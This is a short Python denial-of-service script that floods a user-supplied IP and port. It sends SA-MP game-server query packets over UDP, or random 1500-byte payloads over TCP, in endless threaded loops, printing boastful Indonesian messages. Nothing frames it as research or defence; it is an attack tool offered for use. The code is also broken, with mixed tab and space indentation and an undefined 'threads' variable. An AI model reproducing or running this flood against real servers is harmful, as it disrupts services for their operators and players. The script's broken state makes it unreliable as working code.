#!/usr/bin/env python3
#Code by Rence
import socket, struct, codecs, sys, threading, random, time, os
data = [
 codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
 codecs.decode('081e62da', 'hex_codec'),
 codecs.decode('081e77da', 'hex_codec'),
 codecs.decode('081e4dda', 'hex_codec'),
 codecs.decode('021efd40', 'hex_codec'),
 codecs.decode('081e7eda', 'hex_codec')]

ip = str(input(" Target Ip:"))
port = int(input(" Target Port:"))
choice = str(input(" UDP(y/n):"))
def run():
	while True:
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = data[random.randrange(0, 3)]
            sock.sendto(bytes, (ip, int(port)))
            if int(port) == 7777:
                sock.sendto(data[5], (ip, int(port)))
            elif int(port) == 7796:
                sock.sendto(data[4], (ip, int(port)))
            elif int(port) == 7771:
                sock.sendto(data[6], (ip, int(port)))
            elif int(port) == 7784:
                sock.sendto(data[7], (ip, int(port)))
			print("PACKET DARI CJEY1557 %s TOK TOK BARANG SAMPAI IP %s DAN MEMBERI ROTI KEPORT %s!!"%(ip,port))
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(1500)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			print("PACKET DARI CJEY1557 %s TOK TOK BARANG SAMPAI IP %s DAN MEMBERI ROTI KEPORT %s!!"%(ip,port))
		except:
			s.close()
			print("[*] Error")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()